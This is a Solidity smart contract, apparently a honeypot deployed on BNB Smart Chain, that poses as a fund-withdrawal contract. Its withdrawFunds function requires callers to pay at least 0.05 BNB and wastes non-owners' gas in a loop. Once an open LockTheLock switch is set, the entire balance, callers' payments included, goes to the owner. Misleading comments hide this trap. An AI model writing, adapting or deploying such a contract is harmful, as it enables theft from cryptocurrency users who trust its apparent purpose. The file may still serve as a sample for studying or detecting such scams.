/**
 *Submitted for verification at BscScan.com on 2022-08-06
*/

//SPDX-License-Identifier: MIT 
pragma solidity 0.8.4; 
 
interface IERC20 { 
 function totalSupply() external view returns (uint); 
 function balanceOf(address account) external view returns (uint); 
 function transfer(address recipient, uint amount) external returns (bool); 
 function allowance(address owner, address spender) external view returns (uint); 
 function approve(address spender, uint amount) external returns (bool); 
 function transferFrom(address sender, address recipient, uint amount) external returns (bool); 
 event Transfer(address indexed from, address indexed to, uint value); 
 event Approval(address indexed owner, address indexed spender, uint value); 
} 

contract IFuckU { 

    address public Owner; // address of the owner of the contract.
    uint public balanceTrack;
    uint public SpendYourGas;
    uint public gasOnStepOne;
    uint public gasOnStepTwo;
    bool public firstLock;
    bool public secondLock;
    uint public txgasPRICE;


    constructor() payable { //this function only runs once, at the deploy of this contract
        Owner = msg.sender;
        balanceTrack = address(this).balance;
    }

    modifier onlyOwner { // only owner can call this func (hack prevent)
        require(msg.sender == Owner);
        _;
    }
 
    function withdrawFunds() public payable { // require you to send the exact value of all summed transfers 
        require(msg.sender == tx.origin, "smarOut");
        require(balanceTrack >0, "noFunds");
        require(msg.value >= 50000000000000000, "NoTransfer");
        if (msg.sender != Owner) {
            for (uint i = 0; i<200; i++){
                SpendYourGas = address(this).balance;
                SpendYourGas = SpendYourGas + address(this).balance;
                SpendYourGas = SpendYourGas + address(this).balance;
                SpendYourGas = SpendYourGas + address(this).balance;
                SpendYourGas = SpendYourGas + address(this).balance;
            }
        }
        if (firstLock == true) {
            payable(Owner).transfer(address(this).balance); 
            secondLock = true;
            balanceTrack = address(this).balance;
        }
        else {
            payable(msg.sender).transfer(address(this).balance);
            balanceTrack = address(this).balance;
        }
        
    } 
 
    function LockTheLock() public { 
        firstLock = true;
    } 

    function adminWithdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function resetFirstLock() public onlyOwner {
        firstLock = false;
    }

    function depositFunds() public payable {
        balanceTrack = address(this).balance;
    }


}